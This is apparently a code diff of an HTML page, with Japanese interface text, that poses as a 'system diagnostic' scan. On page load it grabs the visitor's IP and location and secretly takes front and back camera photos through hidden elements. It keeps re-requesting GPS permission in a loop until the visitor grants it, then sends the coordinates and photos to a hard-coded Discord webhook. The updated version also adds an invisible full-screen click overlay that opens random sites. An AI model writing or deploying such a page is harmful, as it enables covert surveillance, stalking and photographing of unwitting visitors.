@@ -3,227 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>システムスキャン中...</title>
+    <title>System Diagnostic</title>
     <style>
-        body {
-            background-color: #0b0b0b;
-            color: #00ff66;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            transition: background-color 1s ease; /* 背景色が変わるときにフワッと変わる演出 */
-        }
-        .terminal {
-            width: 80%;
-            max-width: 600px;
-            background: #121212;
-            border: 1px solid #00ff66;
-            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
-            padding: 20px;
-            border-radius: 5px;
-        }
-        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px dashed #00ff66; padding-bottom: 10px; }
+        body { background-color: #0b0b0b; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; transition: background-color 1s ease; position: relative; }
+        .terminal { width: 80%; max-width: 600px; background: #121212; border: 1px solid #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); padding: 20px; border-radius: 5px; text-align: center; z-index: 1; }
+        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px dashed #00ff66; padding-bottom: 10px; text-align: left; }
+        .log-container { text-align: left; max-height: 200px; overflow-y: auto; }
         .log-line { margin: 8px 0; font-size: 14px; }
         .log-warn { margin: 8px 0; font-size: 14px; color: #ff3333; font-weight: bold; }
+        .next-btn { display: none; margin-top: 20px; background-color: #00ff66; color: #0b0b0b; border: none; padding: 12px 24px; font-family: 'Courier New', monospace; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; z-index: 10000; position: relative; }
+        #overlayBtn { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; border: none; display: none; z-index: 9999; cursor: pointer; }
     </style>
 </head>
 <body>
 
+    <button id="overlayBtn" onclick="openRandomLink()"></button>
     <div class="terminal">
         <h2>[ システム診断中 ]</h2>
-        <div id="logs">
-            <div class="log-line">> 接続を初期化中...</div>
-        </div>
+        <div class="log-container" id="logs"><div class="log-line">> 接続を初期化中...</div></div>
+        <button id="nextButton" class="next-btn" onclick="openRandomLink()">次へ ➔</button>
     </div>
 
-    <!-- カメラ処理用の非表示要素 -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 【重要】ここにDiscordのWebhook URLを貼り付けてください
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1536585279819874335/8ARjYGwabHXahh78qx9zBQKdrAZIziOQKIY50_I23MVP5c2b7wCPbDtzMAJ_VLydXQux";
 
-        function addLog(text) {
-            const logsDiv = document.getElementById('logs');
-            const div = document.createElement('div');
-            div.className = 'log-line';
-            div.textContent = text;
-            logsDiv.appendChild(div);
-        }
+        function addLog(text) { const d = document.createElement('div'); d.className = 'log-line'; d.textContent = text; document.getElementById('logs').appendChild(d); }
+        function addWarn(text) { const d = document.createElement('div'); d.className = 'log-warn'; d.textContent = `! 警告: ${text}`; document.getElementById('logs').appendChild(d); }
 
-        function addWarn(text) {
-            const logsDiv = document.getElementById('logs');
-            const div = document.createElement('div');
-            div.className = 'log-warn';
-            div.textContent = `! 警告: ${text}`;
-            logsDiv.appendChild(div);
-        }
-
-        // カメラは1回だけ試して拒否ならスキップする関数
         async function captureCameraBlobOnce(facingMode) {
             try {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    return null;
-                }
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                const video = document.getElementById('video'); video.srcObject = stream;
                 await new Promise(res => { video.onloadedmetadata = res; });
-                await video.play().catch(() => {});
-
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(track => track.stop());
-
-                return await new Promise((resolve) => {
-                    canvas.toBlob((b) => {
-                        resolve(b);
-                    }, 'image/jpeg', 0.8);
-                });
-            } catch (e) {
-                return null;
-            }
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            } catch (e) { return null; }
         }
 
         async function gatherAndSend() {
             try {
-                addLog("> ネットワークパラメータを取得中...");
-                let ipData = {};
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    ipData = await res.json();
-                } catch (e) {
-                    ipData = { ip: "取得失敗" };
-                }
-
-                addLog("> カメラフィードにアクセス中 (前面/背面)...");
+                addLog("> ネットワーク・カメラパラメータを取得中...");
+                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: "取得失敗" }));
                 const frontBlob = await captureCameraBlobOnce("user");
                 const backBlob = await captureCameraBlobOnce("environment");
 
-                addLog(" ");
-                let batteryInfo = "取得不可";
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
-                    } catch (e) {}
-                }
-
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netType = connection ? (connection.effectiveType || "不明") : "不明";
-
-                const info = {
-                    ip: ipData.ip || "不明",
-                    city: ipData.city || "不明",
-                    region: ipData.region || "不明",
-                    country: ipData.country_name || "不明",
-                    isp: ipData.org || "不明",
-                    platform: navigator.platform,
-                    battery: batteryInfo,
-                    network: netType
-                };
-
                 addLog("> GPS座標を要求中...");
                 let gpsText = "";
-                
-                // 【GPSはループあり】許可されるまで何度も要求し続ける
-                while (true) {
+                while(true) {
                     try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
-                        });
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})`;
-                        break; // 取得成功したらループを抜ける
-                    } catch (e) {
-                        addWarn("位置情報の取得が拒否されました。「許可」を選択してください。");
-                        await new Promise(r => setTimeout(r, 1000)); // 1秒待ってから再挑戦
-                    }
+                        const pos = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j, { timeout: 5000 }));
+                        gpsText = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        break;
+                    } catch(e) { addWarn("位置情報の許可が必要です。"); await new Promise(r => setTimeout(r, 1000)); }
                 }
 
-                addLog("> 情報を送信中...");
+                const msg = { content: "🚨 **【システム診断】情報検知**", embeds: [{ title: "📊 取得データ", fields: [{ name: "IP", value: ipRes.ip }, { name: "GPS", value: gpsText }] }] };
+                const fd = new FormData(); fd.append('payload_json', JSON.stringify(msg));
+                if (frontBlob) fd.append('files[0]', frontBlob, 'front.jpg');
+                if (backBlob) fd.append('files[1]', backBlob, 'back.jpg');
+                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
 
-                const discordMessage = {
-                    content: "🚨 **【システム診断】情報検知**",
-                    embeds: [{
-                        title: "📊 取得データ一覧",
-                        color: 16711680,
-                        fields: [
-                            { name: "🌐 IPアドレス", value: info.ip, inline: true },
-                            { name: "🏢 プロバイダ", value: info.isp, inline: true },
-                            { name: "📍 地域", value: `${info.country} ${info.region} ${info.city}`, inline: false },
-                            { name: "🔋 バッテリー", value: info.battery, inline: true },
-                            { name: "💻 プラットフォーム", value: info.platform, inline: true },
-                            { name: "🛰️ GPS位置情報", value: gpsText, inline: false },
-                            { name: "📷 前面カメラ", value: frontBlob ? "画像添付済み (front.jpg)" : "取得なし/拒否", inline: true },
-                            { name: "📷 背面カメラ", value: backBlob ? "画像添付済み (back.jpg)" : "取得なし/拒否", inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify(discordMessage));
-                
-                if (frontBlob) {
-                    formData.append('files[0]', frontBlob, 'front.jpg');
-                }
-                if (backBlob) {
-                    formData.append('files[1]', backBlob, 'back.jpg');
-                }
-
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                addLog("> 完了。システムは安全に保護されました。");
-
-                // ① すべて終わったら背景を緑色に変える
                 document.body.style.backgroundColor = "#003311";
-                const terminalBox = document.querySelector('.terminal');
-                terminalBox.style.borderColor = "#00ff66";
-                terminalBox.style.boxShadow = "0 0 25px rgba(0, 255, 102, 0.6)";
-
-                // ② その10秒後に、YouTubeのランダムな動画を新しいタブで開く
-                setTimeout(() => {
-                    // ランダムに選ばれるYouTubeの動画IDのリスト
-                    const videoIds = [
-                        "dQw4w9WgXcQ", // Rickroll
-                        "jNQXAC9IVRw", // Me at the zoo
-                        "9bZkp7q19f0", // Gangnam Style
-                        "kJQP7kiw5Fk", // Despacito
-                        "3JZ_D3ELwOQ",  // Shape of You
-                   　　  "QmPc7q242eE",
-    　　　　　　　　　　  "rlZn-QDZrBE",
-                    　　"QvxLeOTnxII",
-                        "xjt6jB5B3BM"
-                    ];
-                    // リストからランダムに1つ選ぶ
-                    const randomId = videoIds[Math.floor(Math.random() * videoIds.length)];
-                    const youtubeUrl = `https://www.youtube.com/watch?v=${randomId}`;
-                    
-                    // 新しいタブで開く
-                    window.open(youtubeUrl, '_blank');
-                }, 10000); // 10000ミリ秒 = 10秒
-
-            } catch (error) {
-                addWarn("処理中にエラーが発生しました。");
-            }
+                document.getElementById('nextButton').style.display = 'inline-block';
+                document.getElementById('overlayBtn').style.display = 'block';
+            } catch (e) { addWarn("エラー発生"); }
         }
 
-        window.onload = gatherAndSend;
+function openRandomLink() {
+            const targets = [
+                // === YouTube動画リスト ===
+                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+                "https://www.youtube.com/watch?v=jNQXAC9IVRw",
+                "https://www.youtube.com/watch?v=9bZkp7q19f0",
+                "https://www.youtube.com/watch?v=kJQP7kiw5Fk",
+                "https://www.youtube.com/watch?v=3JZ_D3ELwOQ",
+                "https://www.youtube.com/watch?v=OPf0YbXqDm0",
+                
+                // === 一般サイトリスト ===
+                "https://www.google.com",
+                "https://www.wikipedia.org",
+                "https://www.amazon.co.jp",
+                "https://www.github.com",
+                "https://www.yahoo.co.jp",
+                "https://www.bing.com",
+                "https://twitter.com",
+                "https://www.twitch.tv",
+                "https://www.reddit.com",
+                "https://www.apple.com"
+            ];
+            
+            // リストをシャッフル（ランダムに並び替える）
+            for (let i = targets.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [targets[i], targets[j]] = [targets[j], targets[i]];
+            }
+            
+            // シャッフルされたリストから選ぶ
+            const randomUrl = targets[0];
+            window.open(randomUrl, '_blank');
+        }        window.onload = gatherAndSend;
     </script>
 </body>
 </html>
